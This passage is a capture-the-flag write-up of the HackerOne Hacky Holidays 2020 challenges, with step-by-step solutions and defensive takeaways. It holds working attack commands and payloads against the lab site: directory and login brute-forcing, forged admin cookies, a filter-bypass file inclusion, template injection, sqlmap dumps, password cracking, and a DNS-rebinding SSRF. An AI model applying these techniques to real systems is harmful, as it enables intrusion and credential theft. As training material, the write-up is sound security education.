Using the hosts that I hard-coded in a script and their links it's possible to DDoS Grinch Networks.
We'll be redirected to the final page and get the last flag.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/attack-box
  * Log in with username - `grinchadmin` and password - `s4nt4sucks`
  * Intercept requests with Burp Suite. Click on `Attack` button and notice requests that are being done
  * Notice a request to 

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

  * payload parameter decodes into 

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

{F1140124}
  * Download the script {F1140135}
  * Lauch the script with target and hash values as first and second arguments for the script and a wordlist as the third.

```
python3 hash_target.py 203.0.113.33 5f2940d65ca4140cc18d0878bc398955 ~/Tools/lists/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

{F1140125}
  * To verify that  the salt is the same across different IPs, execute the command again with other values.

```
echo eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ== | base64 -d
```

  * The salt is `mrgrinch463` and an algorithm for hash - md5(salt + data_to_hash)
  * Localhost check bypass using DNS rebinding (You should try a couple times, as it may not work at first)
  * Download ssrf.py {F1140134}
  * Go to https://lock.cmpxchg8b.com/rebinder.html
  * Set A to 8.8.8.810 and B to 127.0.0.1 . Copy the result (it should be `0808080a.7f000001.rbndr.us`)
  * Execute ssrf.py script to get an attack links (I've hardcoded hosts you were looking into)

```
python3 ssrf.py mrgrinch463 
```

{F1140126}
  * Navigate to the links that you got (e.g. https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiAiMDgwODA4MGEuN2YwMDAwMDEucmJuZHIudXMiLCAiaGFzaCI6ICIyNTE5YTA1YzA3M2YxMmYxNzg3MTdkYTNlYjlhZDczMyJ9)    
{F1140131}
  * Once the attack works, you should be able to take down Grinch Networks - https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709

{F1140127}

### Key takeaways
Never give up, as I though to give up thrice on this challenge.
- **2020-12-31** @yso: # Executive Summary:
This year Mr Grinch has gone hi-tech and decided to ruin our Christmas, but thanks to a threat intelligence team we have got to know his intentions and therefore we put up a special Incident Response team just for this case. After a couple of days of hard work, the IR team successfully infiltrated his network and took him down just right on Christmas eve. 

# Technical Summary:
During the assessment IR team identified and exploited the following weaknesses and vulnerabilities:
1. Information Disclosure through files for web crawlers
2. Information Disclosure through javascript files
3. Insecure direct object reference
4. Information Disclosure due to lack of Authentication control
5. User Enumeration and Password Enumeration due to descriptive messages. Weak credentials
6. Source code exposure. Weak filter bypass that leads to PHP LFI.
7. Directory listing and SSTI
8. Source code leakage with secrets through an open git repository. Weak password usage.
9. Second-order SQL Injection
10. Source code exposure through developer comments. Insecure usage of functions that leads to overflow and thus arbitrary user creation with administrator privileges.
11. Double SQL Injection and Path Traversal
12. Insecure cryptographic salt usage. The predictive  algorithm used. DNS Rebinding attack


# Detailed explanation of issues and walk through:

## 1.  Information Disclosure through files for web crawlers
The default web crawler files like robots.txt or humans.txt sometimes may contain valuable to attackers information (e.g. hidden directories, which are difficult to brute force).
### Steps to reproduce
  * Launch the following command            
```
~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 80 -x txt,php
```
  * In the output you should be able to find robots.txt
  * Open a browser and navigate to the following link https://hackyholidays.h1ctf.com/robots.txt
{F1140069}

### Key takeaways
In the real world, it is not an issue on its own and would definitely need a context in order to be a valid security issue. It might be used in a chain of vulnerabilities/missing of best practices and weaknesses.

## 2.  Information Disclosure through javascript files
Sometimes developers modify legacy Javascript code for debugging purposes, but they tend to forget to remove it before the release. The issue sometimes may lead to information disclosure of sensitive content, the same as it was in our story. IR team followed the hidden link `/s3cr3t-ar3a` and discovered that `assets/js/jquery.min.js` was modified and it contained the code that printed sensitive flag in the HTML document.
### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/s3cr3t-ar3a
  * Press Ctrl+U . HTML source code should be shown. 
  * Now find a script `/assets/js/jquery.min.js`
  * Download the script using this command `wget https://hackyholidays.h1ctf.com/assets/js/jquery.min.js`
  * unminify the js code by using this command: `js-beautify -o jquery.js jquery.min.js`
  * Look at the first 50 lines of the file: `head -n 50 jquery.js`
  * Find references to h1_0, h1_2 variables. After analysing this piece of code we understand that we have to look for `alertbox` on the page using developer tools. Alternatively, we can change JS code a bit and execute it in order to get the flag,
  * Navigate to https://hackyholidays.h1ctf.com/s3cr3t-ar3a again
  * Open Developer Tools by pressing Ctrl+Schift+I 
  * Click on Inspector on the Developer Tools toolbar, and try to search for `#alertbox`
  * We should be able to find our flag data-info parameter. 

{F1140070}

### Supporting Material/References:

### Key takeaways
In the real world, it is pretty common to find and analyze JS files, especially those which are custom. A tool such as js-beautify and a mindset for finding interesting or strange code is essential for such weaknesses. 

## 3. Insecure direct object reference
After navigating to https://hackyholidays.h1ctf.com/apps, which was a hinted location in the JS file at the second stage, we find eight different buttons. Each button is a link to another mini-app that IR team had to crack during the hunt for a secret area portal. The first target was people-rater mini-app. 

After navigating to https://hackyholidays.h1ctf.com/people-rater , IR Team intercepted two GET requests. One of them was representing `/people-rater/page/1` and the second one was `people-rater/entry?id=eyJpZCI6Mn0=`. The first endpoint was returning JSON file with a list of `{"id":"base64_encoded_value", name:"Name"}`. Then the Team had to enumerate each page by increasing and decreasing the number in the request. Thanks to that it became evident that `/people-rater/page/1` is the first page. 

Secondly, IRT decoded the first base64 encoded value `eyJpZCI6Mn0=` , which contained `{"id":2}`. After that the logic was simple - we had to send a base64 encoded value of  `{"id":1}` to `people-rater/entry?id=` 

### Steps to reproduce
  * Set up a proxy like Burp Suite or ZAP
  * Navigate to https://hackyholidays.h1ctf.com/people-rater
  * Go to the Burp Suite. Find the request to `/people-rater/page/0`
{F1140071}
  * Base64 decode `eyJpZCI6Mn0=`. You should get `{"id":2}`
{F1140072}
  * Decrease the id by 1 and base64 encode it. You should get `eyJpZCI6MX0=`
  * Now send a GET request to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
{F1140073}

### Key takeaways
Always look into each parameter and assume something may be hidden

## 4. Information Disclosure due to lack of Authentication control
As always, the first step was to study the app itself. The app had an interesting functionality that s
et a `token` cookie when the user entered a valid username and password that led us to look into
how we could sing in.

The default endpoint bruteforce gave us a few endpoints, such as `/api/purchase` and `/api/sessions`. But in order to discover all endpoints a negative status code filter should have been used. This interesting technique gave us another endpoint - `/api/user`, which returned a 400 error.

The `/api/sessions` endpoint returned a list of sessions, where only one was interesting. And thanks
to what we discovered before, we knew that it should be used inside a `token` cookie.

But it wasn't the end, so that's why we decided to brute-force parameters on `/api/user`, and that gav
e us an `uuid` parameter, the same parameter which was found in session, so all we had to do in order
 to get a flag is to send a request to `/api/user` endpoint with a session token in a cookie and a parameter `uuid` which value was taken from the session token.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/swag-shop
  * Find request to api endpoints and initiate a scan of the api endpoint. (don't forget to change the directory)

```
~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 60 -b 404
```

{F1140075}
  * Got to the Burp Suite, do a request to swag-shop/api/user

```
GET /swag-shop/api/user HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1GET
```

  * Then bruteforce a parameter on /swag-shop/api/user endpoint

```
wfuzz --hc 400 -w ~/Tools/lists/SecLists/Discovery/Web-Content/burp-parameter-names.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1
```

   * Do a GET request to swag-shop/api/sessions  and find a list of sessions. copy the third one (the longest)

```
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
```

{F1140076}
   * Decode the longest session token. It should decode to 

```
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```
   * The place a token to a Cookie header `Cookie: token=[TOKEN]` and copy UUID from the token and place it into `uuid` parameter. Send the request.

```
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
Referer: https://hackyholidays.h1ctf.com/apps
Upgrade-Insecure-Requests: 1
```

{F1140077}

### Supporting Material/References:

### Key takeaways
Sometimes one should fuzz using a negative match, not just a default setup.


## 5. User Enumeration and Password Enumeration due to descriptive messages. Weak credential
This app had a strange error saying `Invalid Username` when we tried to log in, that's why we decided to brute-force the usernames and hope that the app would return another descriptive error for a password. Here it should be noted that mostly everyone fell in a trap by not assuming that `Invalid Username` and `Invalid Password` have the same length.

Indeed it if you brute force by first filtering out `Invalid Username` and then filtering out `Invalid
Password` - you get `access:computer`.

After successfully signing in, the server issued a `securelogin` cookie that contained a base64 encoded value of a cookie parameter and admin parameter, which was set to false. Apparently, no checks were implemented, and just by changing `"admin":false` to `"admin":true` did the trick and we became an admin.

On the admin page we found a zip file accessible for download. Unfortunately, it was password protected, but a tool like `zip2john` helped to get a hash of the password ready for a brute-force using `john
`. The password is easy - `hahahaha`. Using it, we unzipped a zip file and got a flag.


### Steps to reproduce
  * Navigate to  and send a login request using username: user and password pass. Observe a descriptive error `Invalid Username`
  * Start a username brute-force attack. You should get a username: access

```
wfuzz -u https://hackyholidays.h1ctf.com/secure-login -w ~/Tools/lists/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=pass' --hs 'Invalid\ Username'
```

{F1140086}
  * Go to the login page in the browser again and send a login request using username: access and password pass. Observe a descriptive error `Invalid Password`
  * Start a password brute-force attack. You should get a password: computer

```
wfuzz -u https://hackyholidays.h1ctf.com/secure-login -w ~/Tools/lists/SecLists/Passwords/Common-Credentials/10k-most-common.txt -d 'username=access&password=FUZZ' --hs 'Invalid\ Password'
```

  * Intercept requests using Burp Suite, go the login page and authenticate youself using `access` as a username and `computer` as a password.
  * Send that request to Repeater and send it to the host again. You should get a redirect with setting a cookie

```
Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;
```

  * URL- and base64- decode the cookie and you should get

```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

  * Change admin parameter to `true`, url- and base64- decode the cookie. After that send a GET request to /secure-login with the new cookie.

```
GET /secure-login HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackyholidays.h1ctf.com/secure-login
Connection: close
Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d
Upgrade-Insecure-Requests: 1

```

{F1140085}
  * In the Response you can find a link to `/my_secure_files_not_for_you.zip` file
  * Grab ZIP file - https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip
  * If you try to open with the old password - you'll fail. So we have to use `john2zip` in order to create a hash, that we will brute

```
~/Tools/john/run/zip2john my_secure_files_not_for_you.zip > encrypted.zip.hash
```

  * Then execute the actual brute-force command

```
~/Tools/john/run/john encrypted.zip.hash --wordlist=/home/strawberry/Tools/lists/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

  * The password that you'll get is - `hahahah`. Use it to open either using GUI or using this command

```
unzip unzip my_secure_files_not_for_you.zip
```

  * cat the flag.txt. Note it's better not to see xxx.png file)
{F1140084}

### Supporting Material/References:

### Key takeaways
Sometimes the grep is better than checking just the size, because the error could be the same length as what you are trying to filter out.

## 6. Source code exposure. Weak filter bypass that leads to PHP LFI.
After opening an app, we saw a template parameter setting `entries.html`. The endpoint Bruteforce showed us that the app is written in php, and the file that is being executed as default is `index.php`.
That led us to an idea to include `index.php` in `template` parameter, which gave us its source-code.

After studying a source-code, I discovered that there are `admin.php` and `secretadmin.php` files that are our targets. Also, there are checks implemented, but truth to say they are weak, e.g. `str_replace` function that replaces only the first occurrence with the empty string, so that `admadmin.php.php` will become `admin.php`

Following that way, I constructed a payload - `secretadminsecretadadmin.phpmin.php.php` that resulted into `secretadmin.php` after all replacements. That way we included a `secretadmin.php` source code and got our flag

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/my-diary
  * Notice template parameter and change it to index.php e.g. https://hackyholidays.h1ctf.com/my-diary/?template=index.php (You should get code of index.php)
{F1140087}
  * Read the code, understand the logic
  * Construct a payload that bypasses protections.
  * Send a request with the payload - https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadadmin.phpmin.php.php
{F1140088}
  * Get the flag

### Supporting Material/References:

### Key takeaways
Never use one-time replacing function, where you need recursion.

## 7. Directory listing and SSTI
Hate-mail-generator is some campaign creation mini-app that has an example, that was created for us. The example contains template braces like `{{name}}`, which is replaced by `Bob` in preview mode. Also, an example has `{{template:cbdj3_grinch_header.html}}`, which is being replaced by HTML code found in this template.

Bruteforcing directories gave us a `/templates` directory. A directory listing on this directory gave us a new template `38dhs_admins_only_header.html`, but unfortunately the template is not accessible directly.

But thanks to Mr Grinch, because he left us an ability to create and preview our own campaigns. After intercepting the request, we saw that `preview_data` parameter is being supplied with `preview_markup`, where preview_data contained a JSON with the keys and values that are reflected in the campaign message.

This all led us to injection of a template `{{template:38dhs_admins_only_header.html}}` as the value of `name` key in `preview_data`, also where `preview_markup` was including `{{name}}`. That way we tricked an application to first fetch the template code and secondly reflect it in our variable.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/hate-mail-generator
  * Start a brute force of directories (you should find templates directory.

```
~/go/bin/gobuster https://hackyholidays.h1ctf.com/hate-mail-generator/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40
```

{F1140092}
  * Click on `Guess What` (https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030)     
{F1140090}
  * Look at the markup, copy this part `{{template:cbdj3_grinch_header.html}}`
{F1140091}
  * Go back. And click on `Create New` (https://hackyholidays.h1ctf.com/hate-mail-generator/new)
  * Set up a Burp Suite Proxy.
  * Enter a name, subject and add our copied markup. Click on `preview`
  * Intercept the request and send it to repeater. Notice preview_data parameter which decodes to `{"name":"Alice","email":"alice@test.com"}`
  * Go to https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and copy 38dhs_admins_only_header.html
  * In Repeater change preview_data parameter content to `{"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}`
  * Send a new request

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 210
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Upgrade-Insecure-Requests: 1

preview_markup=Hello+%7B%7Bname%7D%7D+....+%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D&preview_data=%7B%22name%22%3A%22{{template:38dhs_admins_only_header.html}}%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

{F1140093}
  *  Get your flag

### Supporting Material/References:

### Key takeaways
Always try different injection points, like preview_markup and preview_data, not just one

## 8. Source code leakage with secrets through open git repository. Weak password usage.
The next task was solved with some luck, as I had to ask help from Google, by googling `grinch networks forum` and clicking on a 5th link, which redirected me to the github page of a creator of this CTF. The strange thing was, that the `forum` repository was open, but wasn't listed in repository column, only that it was the last repository to which adamtlangley created a commit.

I cloned the repository and used `git` tool to look through the history of commits. One commit was suspicious - `small fix`. After scrolling a bit, I found credentials `forum` as username and `6HgeAZ0qC9T6CQIqJpD` as password.

The credentials were used on `/phpmyadmin` endpoint, which then led to getting md5 hash of grinch password. Bruteforcing the password locally with the help of hashcat gave nothing, but I decided to check the hash using online service, that has much bigger hash:password collections than I do. And indeed, using crackstation.net, cmd5.ru or another service gave a password - `BahHumbug`.

Logging into grinch account gives us powers to look into secret messages and grab the flag.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/forum
  * Brute-force directories. It should find an interesting `phpmyadmin` directory

```
~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/forum/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40
```

  * Look for `grinch networks forum` in Google
{F1140101}
  * Navigate to the fifth result - https://github.com/adamtlangley
  * If we study the first page, we'll notice `Grinch-Networks/forum` repository
  * Clone the repository, check history of commits and look into an interesting commit

```
git clone https://github.com/Grinch-Networks/forum
cd forum
git log
git log -p -2
```

{F1140102}
  * After scrolling down, you should find a line with credentials `self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );`
  * Use credentials to authenticate yourself on `phpmyadmin` endpoint
  * Click on `forum`, then on `user` . (https://hackyholidays.h1ctf.com/forum/phpmyadmin/?db=forum&table=user)  

{F1140103}
  * Copy the hash of Mr Grinch. `35D652126CA1706B59DB02C93E0C9FBF`
  * Use online service like crackstation.net to find a clear-text password. The password is - `BahHumbug`
  * Now login to `grinch` account using password `BahHumbug` using the first login page - https://hackyholidays.h1ctf.com/forum/login
{F1140104}
  * Navigate to https://hackyholidays.h1ctf.com/forum/3/2
{F1140105}
  * Get the flag

### Supporting Material/References:

### Key takeaways
Close repositories and delete history! If you attack, then look for open repos and look at commit history.

## 9. Second-order SQL Injection
Evil-quiz was pretty easy. In order to prove that we have a SQL Injection I had to create two different accounts, the first name was `admin"` and the second name was `admin'`. After submitting a quiz we were redirected to the score page, where in the first case we had at least one user with the same name, and in the second case, we always had 0 users with the same name. Even after I create another user with a name `admin'` - the number didn't change, it was still 0.

That meant that the application was querying a database for usernames like the one we supplied and counting them. The query failed, and the resulting number was 0.

In order to exploit this second-order SQL Injection, we had to make sqlmap differentiate between what's a true answer and what's not because the size of the response doesn't change. `--regexp` argument
helped us to match all values that didn't match `There is 0 other player(s) with the same name as you!`, but matched the same line with a different number like 1,5,242, etc.

Then it was just a matter of time when we get the credentials. After we got them, we just logged in and got a flag.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/evil-quiz
  * Set name to `admin"`, finish the quiz and note the answer on a score page.

```
There is 1 other player(s) with the same name as you!
```

{F1140108}
  * Navigate to https://hackyholidays.h1ctf.com/evil-quiz again
  * Set name to `admin'`, finish the quiz and note the answer on a score page.

```
There is 0 other player(s) with the same name as you!
```

{F1140109}
{F1140110}
  * As it's definitely a second order sql injection we would like to check it and dump DB quickly. For that intercept 2 requests (POST to /evil-quiz with name parameter and GET to /evil-quiz/score)  and save them to files first.req, second.req 

first.req

```
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: https://hackyholidays.h1ctf.com
Connection: close
Cookie: session=b4d9476eed4279882950934fdad25595;
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Upgrade-Insecure-Requests: 1

name=admin*

```

second.req

```
GET /evil-quiz/score HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
Cookie: session=b4d9476eed4279882950934fdad25595;
Upgrade-Insecure-Requests: 1

```

  * Now send use this sqlmap command. Answers to questions - Y,Y,N,N

```
sudo sqlmap -r first.req --second-req second.req --regexp='There is [0-9]*[1-9][0-9]* other player\(s\)' 
```

  * Now dump a table with admin and password

```
sudo sqlmap -r first.req --second-req second.req --regexp='There is [0-9]*[1-9][0-9]* other player\(s\)' -D quiz -T admin --dbms=mysql --dump
```

```
| id | username | password          |
+----+----------+-------------------+
| 1  | admin    | S3creT_p4ssw0rd-$ |
+----+----------+-------------------+
```

{F1140112}
  * Login to https://hackyholidays.h1ctf.com/evil-quiz/admin using found credentials
  * Get the flag

### Supporting Material/References:

### Key takeaways
Look for strange behaviour and check it twice with different accounts.

## 10. Source code exposure through developer comments. Insecure usage of functions that leads to overflow and thus arbitrary user creation with administrator privilege
The signup-manager was different from other apps, in a way that we had to study source-code, that we got because of the developer comment in HTML file.

It was clear that all we had to do is to overflow some part of the string in order to add at least one character to it and set the last character of `lastname` as `Y`. That way, we would become an admin user.

All parameters were interesting, but the password and token are md5 hashes, and we cannot change their character length. username, lastname and firstname are being checked and only first 15 characters are taken from them. But there is an `age` parameter that isn't being stripped into 15 characters, but rather it's checked whether it is numeric, whether it's more than 3 characters and is cast into an integer value.

The functions that are being used are `is_numeric` and `intval`. After reading their documentation its clear that we can supply characters in different notation, e.g. in scientific one, so that our value would bypass `is_numeric` and `strlen` check, but would casted in much bigger integer by `intval`.

That's why we supplied 1e3, which is 1*10^3 = 1000 as the value of age argument. And that's how we got a flag and got to know about a new endpoint - `/r3c0n_server_4fdk59`

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/signup-manager/
  * Look at HTML source code. Ctrl+U . Find a comment with README.md
{F1140113}
  * Download a readme file https://hackyholidays.h1ctf.com/signup-manager/README.md
  * Read the file. Download and unzip https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip

```
wget https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
unzip signupmanager.zip
```

  * You'll have to analyze the source code.     
{F1140114}
  * The most interesting and right part of the source code is:

```
if (!is_numeric($_POST["age"])) {
       $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
       $errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);

```

  * After reading the docs, we notice that there are insufficient checks implemented:
https://www.php.net/manual/en/function.is-numeric.php
https://www.php.net/manual/en/function.intval.php
  * We are able to send a number in a scientific notation like `1e3` (means 1*10^3), that helps us to bypass the check on more than 3 characters and set admin privileges for ourselves.
  * Send the following POST request to the target

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Upgrade-Insecure-Requests: 1

action=signup&username=username_urqxn&password=pass&age=1e3&firstname=YYYYYYYYYYYYYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
```

{F1140115}
  * The application will set a `token`. If it's not set automatically, copy it and set it manually and send another request

```
GET /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: token=9e9354b6c3a1f5e7686813daf14ac4b5;
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Upgrade-Insecure-Requests: 1

```

{F1140116}
  * Get the flag and discover a new endpoint - `/r3c0n_server_4fdk59`

### Key takeaways
Search for developer comments. Read the documentation of functions.

## 11 Double SQL Injection and Path traversal
Recon server was a bit hard due to it's a rather new technique for me. Firstly I found a SQL Injection in a hash parameter of `/album` endpoint, but it didn't give much at first. Only after I decided to check other parts of an app, I found that there is another endpoint - `/picture` that fetches an image from `/uploads` directory. The value of a parameter used in picture endpoint is b64 encoded and contains a path and an auth md5 token, which is being checked and just changing the path value gives nothing.

The default page said that an API is being developed, and after finding an `/api` endpoint and trying to brute-force further, it became evident that only an app can access them.

It's not possible to forge an auth token ourselves, and it's not possible to get at least an image directly, that's why I thought on how we could make the app forge the path for us. That's when I decided to fuzz the sql injection again, and as a result, I discovered a second sql injection, an internal one,
that changed the path and if done right signed with auth token. In that way, we could perform a path traversal attack.

Thanks to a path traversal and auth forging, we were able to brute-force an api endpoint and find a few of them, where one was really interesting - `user`, brute-forcing parameters gave us `username` and `password`. After that, I fuzzed them and found that they act as a `LIKE` operator and by submitting `%` we match any character, any substring of any length, so that we can brute force and get a username and password.

The username and password should be used on `/attack-box` endpoint.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
  * Start bruteforcing directories (you'll find api endpoint)

```
~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40
```

  * Find SQL Injection in `hash` parameter https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k
  * Start the sqlmap 

```
sudo sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'
```

  * Notice that this endpoint accesses 
  * After enumerating, fuzzing and assuming that this was a subquery it was possible to inject the second injection. 
  * Download a script that fuzzes API endpoints and parameters - {F1140133}
  * launch API endpoint brute-force 

```
python3 double_sql.py -w ~/Tools/lists/SecLists/Discovery/Web-Content/common.txt --postfix ?s=1 -s 404
```
    
{F1140120}
  * launch parameter brute-force

```
python3 double_sql.py -w ~/Tools/lists/SecLists/Discovery/Web-Content/common.txt --prefix user? --postfix =1 -s 404,400
```
    
{F1140121}   
  * download {F1140136} and launch username enumeration (launch for each character) result - `grinchadmin` 

```
python3 double_sql.py -w characters.txt -s 400 --prefix user?username=g --postfix % -s 204
python3 double_sql.py -w characters.txt -s 400 --prefix user?username=grinch --postfix % -s 204
```

  * launch password enumeration (launch for each character) result - `s4nt4sucks`

```
python3 double_sql.py -w characters.txt -s 400 --prefix 'user?username=grinchadmin&password=' --postfix % -s 204
python3 double_sql.py -w characters.txt -s 400 --prefix 'user?username=grinchadmin&password=s4nt' --postfix % -s 204
```
  
{F1140122}
  * Navigate to hackyholidays.h1ctf.com/attack-box/ and use credentials `grinchadmin` and `s4nt4sucks` to sign in   
{F1140123}
  * Take the flag
### Supporting Material/References:

### Key takeaways
Always fuzz

## 12. Insecure cryptographic salt usage. Predictive algorithm used. DNS Rebinding attack
Attack box, the last app, that we had to crack. After logging in with the credentials we found before, we explored the functionality, and I saw that Mr Grinch was doing a DDoS attack on a couple of IPs. Our mission was to take him down, so what we needed is to change the IP to his.

